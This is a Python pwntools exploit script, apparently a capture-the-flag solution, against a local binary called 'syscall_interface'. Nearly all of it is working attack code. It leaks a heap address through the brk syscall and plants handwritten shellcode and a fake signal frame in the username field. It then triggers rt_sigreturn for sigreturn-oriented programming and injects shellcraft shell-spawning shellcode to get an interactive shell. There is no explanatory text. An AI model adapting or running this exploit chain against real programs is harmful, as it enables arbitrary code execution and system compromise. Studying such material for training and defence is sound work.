from pwn import *

p = process('./syscall_interface')
#p = remote()
context.update(terminal=["tmux","splitw","-h"],
        log_level = "debug",
        os = "linux",
        arch = "amd64",
        endian = "little")
def sl(a):
    p.sendline(a)

def sn(a):
    p.send(a)

def rv(a):
    return p.recv(a)

def rl():
    return p.recvline()

def sla(a,b):
    p.sendlineafter(a,b)

def sa(a,b):
    p.sendafter(a,b)

def ru(a):
    return p.recvuntil(a)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def execute(sys_num,argu):
    sla('choice:','0')
    sla('number:',str(sys_num))
    sa('argument:',argu)

def up_name(name):
    sla('choice:','1')
    sa('username:',name)

def hack():
    gdb.attach(p,'b *0x555555554000+0xec8')
    execute(135,str(0x400000))
    #raw_input()
    execute(12,'0')
    ru('RET(')
    heap_base = int(rv(14),16) - 0x21000
    lg('heap_base',heap_base)
    data = [0]*0x10
    data[0] = u64(asm('push rsp;pop rsi;xor rdi,rdi;syscall').ljust(8,'\x90'))
    data[2] = 0x300
    data[5] = heap_base + 0x240
    data[6] = heap_base + 0x290
    data[8] = 0x002b000000000033
    #for i in range(0x7f):
    #    payload += chr(i)
    payload = flat(data)[:0x7f]
    up_name(payload)
    #raw_input()
    execute(12,'0')
    execute(15,'0')

    payload = '\x00'*0x57 + asm(shellcraft.sh())
    sl(payload)
    p.interactive()
hack()
